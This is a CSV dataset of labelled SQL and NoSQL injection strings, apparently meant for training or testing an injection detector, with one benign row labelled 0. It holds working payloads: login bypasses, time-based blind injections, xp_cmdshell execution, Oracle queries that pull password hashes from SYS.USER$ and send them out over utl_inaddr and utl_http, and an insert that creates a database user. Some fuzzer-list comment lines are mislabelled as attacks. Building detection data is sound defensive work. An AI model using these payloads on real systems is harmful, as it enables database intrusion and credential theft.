payload,label
") or benchmark(10000000,MD5(1))#",1
declare @s varchar (8000) select @s = 0x73656c ...,1
asc,1
or (EXISTS),1
exec sp,1
or '7659'='7659,1
' or 1 --',1
' or ''-',1
hi') or ('a'='a,1
a' or 1=1--,1
%28,1
union all select @@version--,1
")) or benchmark(10000000,MD5(1))#",1
"benchmark(10000000,MD5(1))#",1
'%20%26%26%20this.passwordzz.match(/.*/)//+%00,1
admin' or 1=1,1
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i",1
&,1
' or 0=0 #,1
' ',1
declare @q nvarchar (200) 0x730065006c00650063 ...,1
""" or isNULL(1/0) /*",1
'; exec xp_regread,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i",1
1 exec sp_ (or exec xp_),1
"admin"" or 1=1",1
# contains statements from jbrofuzz,1
"root"" --",1
' or ''&',1
/**/or/**/1/**/=/**/1,1
' or pg_sleep(__TIME__)--,1
declare @q nvarchar (200) select @q = 0x770061 ...,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i",1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i",1
)) or sleep(__TIME__)=',1
""" or benchmark(10000000,MD5(1))#",1
' or 1=1--,1
"' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--",1
|| 1==1,1
# regex replace as many as you can with your fuzzer for best results:,1
procedure,1
""")) or benchmark(10000000,MD5(1))#",1
root' or '1'='1'#,1
or true--,1
"1, $where: '1 == 1'",1
""" or 1=1/*",1
) or ('a'='a,1
"or 1=1 or """"=",1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i",1
1;SELECT%20*,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",1
1' or '1'='1,1
-- &password=,1
1' and 1=(select count(*) from tablenames); --,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i",1
hi or a=a,1
update,1
PRINT,1
"' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --",1
email=user@example.com&name=John+Doe,0
; exec xp_regread,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i",1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i",1
'sqlattempt1,1
||'6,1
"root"" or 1=1 or """"=""",1
or 1=1,1
declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),1
""" or sleep(__TIME__)=""",1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i",1
') or pg_sleep(__TIME__)--,1
hi' or 1=1 --,1
; begin declare @var varchar(8000) set @var=' ...,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i",1
"""a"""" or 3=3--""",1
"{""$gt"": """"}",1
admin' or 1=1/*,1
x' OR full_name LIKE '%Bob%,1
' or '' ',1
0,1
' or 3=3,1
x' AND userid IS NULL; --,1
"# also try to brute force a list of possible usernames, including possile admin acct names",1
),1
admin') or '1'='1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i",1
%27%20or%201=1,1
"root"") or ""1""=""1""/*",1
or 2 > 1,1
or%201=1 --,1
"root"" or 1=1--",1
""") or sleep(__TIME__)=""",1
';waitfor delay '0:0:__TIME__'--,1
or '1'='1'--,1
admin'/*,1
'hi' or 'x'='x';,1
'||utl_http.request('httP://192.168.1.1/')||',1
<username>' OR 1=1--,1
having,1
delete,1
; execute immediate 'sel' || 'ect us' || 'er',1
union select * from users where login = char ...,1
